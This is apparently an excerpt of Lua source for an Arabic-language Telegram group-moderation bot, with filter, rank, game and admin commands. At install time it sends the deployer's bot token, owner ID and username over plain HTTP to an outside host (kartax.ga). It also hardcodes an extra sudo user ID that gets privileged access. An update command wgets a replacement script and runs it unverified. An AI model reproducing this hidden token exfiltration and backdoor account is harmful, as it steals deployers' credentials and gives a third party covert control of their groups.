...
https.request('http://kartax.ga/C_3333/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("C_3333", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/C_3333
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./C_3333.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("xc", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S C_3333 -X kill
screen -S C_3333 ./C_3333
done
]])  
file:close() 
...
sudo_users = {SUDO,886086827,886086827}   
...
if tonumber(user_id) == tonumber(886086827) then  
var = true  
elseif tonumber(user_id) == tonumber(886086827) then
var = true  
...
local C_3333_Msg = ''  
if msgs < 100 then 
C_3333_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
C_3333_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
C_3333_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
C_3333_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
C_3333_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
C_3333_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
C_3333_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
C_3333_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
C_3333_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
C_3333_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
C_3333_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
C_3333_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
C_3333_Msg = 'رب التفاعل '  
end 
return C_3333_Msg 
end
...
function plugin_C_3333a(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.C_3333a and msg then
pre_msg = plugin.C_3333a(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceC_3333(msg,data) -- بداية العمل
if msg then
...
SourceC_3333r = '📥┇مرحبا بك عزيزي 👋🏼،\n🔰┇انا بوت حمايه المجموعات  ؟\n📮┇يمكنك اضافتي الى مجموعتك •\n🖇┇آضفني وارفعني مشرف ارسل < تفعيل >\n[📡┇قناة سورس البوت](t.me/C_3333)'
end 
send(msg.chat_id_, msg.id_, SourceC_3333r) 
end
end
...
send(msg.chat_id_, msg.id_,C_3333_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local C_33331 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..C_33331.server.uptime_in_days..'('..C_33331.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..C_33331.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..C_33331.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..C_33331.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ☑️' and SudoBot(msg) then 
os.execute('rm -rf C_3333.lua')
os.execute('wget https://raw.githubusercontent.com/SORESEVEO/C_3333/master/C_3333.lua')
send(msg.chat_id_, msg.id_,'🗂️┇ تم تحديث السورس')
dofile('C_3333.lua')  
end
if text == 'الاصدار⚙️' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'📡┇ اصدار سورس ميرا \n📟┇ الاصدار ←{ 1.2v}') 
end
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..C_3333k..''..C_3333..'\n*📌┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'C_3333')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'C_3333')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local C_33331_Msg = database:get(bot_id.."C_33331:Add:Filter:Rp2"..text..msg.chat_id_)   
if C_33331_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'C_3333')..') \n 📬┇'..C_33331_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if C_3333_Msg and not Special(msg) then  
local C_3333_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if C_3333_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..C_3333_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/C_3333)}\n🚫┇["..C_3333_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠┇عذرا يا » {["..data.first_name_.."](T.ME/C_3333)}\n📮┇ الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'C_3333')..') \n☑️┇ تـم قفـل الدردشه\n⛔┇ الحاله ← المسح ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'C_3333')..') \n☑️┇ تـم قفـل التاك بالكتم\n⛔┇ الحاله ←الكتم ')  
end,nil)   
...
database:set(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┇ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."C_33331:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."C_33331:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┇تم منع الكلمه مع التحذير")  
database:del(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."C_33331:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."C_33331:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."C_33331:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
database:set(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."C_33331:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."C_33331:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."C_33331:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."C_33331:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."C_33331:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."C_33331:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┇قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local C_3333_Msg = database:get(bot_id.."C_33331:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..C_3333_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'C_3333')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ميرا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ميرا')
local C_3333_Msg = {
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
'نايم حبي نايم',
...
send(msg.chat_id_, msg.id_,'['..C_3333_Msg[math.random(#C_3333_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ميرا').." غادر" or text == 'غادر' then  
...
-- vardump(data) 
C_3333dx(msg.chat_id_, msg.id_, '📤┇ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┇ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┇ عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆┇ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
〽️┇م1 » لعـرض قائمهہ‌‏ الحمايهہ‌‏
〽️┇م2 » لعـرض التفعـيل والتعطـيل
〽️┇م3 » لعرض اوامـر الوضع ~اضف
〽️┇م4 » لعرض اوامـر الحذف 
〽️┇م5 » لعرض اوامر الرفع والتنزيل
〽️┇م6 » لعرض اوامر المجموعهہ‌‏
〽️┇م7 » لعرض اوامر المطور
〽️┇م8 » لعرض اوامر المطـور الاساسي
〽️┇م9 » لعرض اوامر الاعضـاء
ٴ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
ٴ📤┇ [Source Channel](t.me/C_3333)
]]
...
KlamSpeed = {'سحور','سياره','استقبال','قنفه','ميران','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
...
name = string.gsub(name,'ميران','و ن ف ا')
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ميرا')
...
C_3333 = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(C_3333)
...
--------------------------------------------------------------------------------------------------------------
SourceC_3333(data.message_,data)
plugin_C_3333a(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local C_3333Abot = database:get(bot_id.."C_33331:Add:Filter:Rp2"..text..result.chat_id_)   
if C_3333Abot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..C_3333Abot.."] \n") 
...
------------------------------------------------------------------------
if text then
local C_33331_Msg = database:get(bot_id.."C_33331:Add:Filter:Rp2"..text..result.chat_id_)   
if C_33331_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..C_33331_Msg)
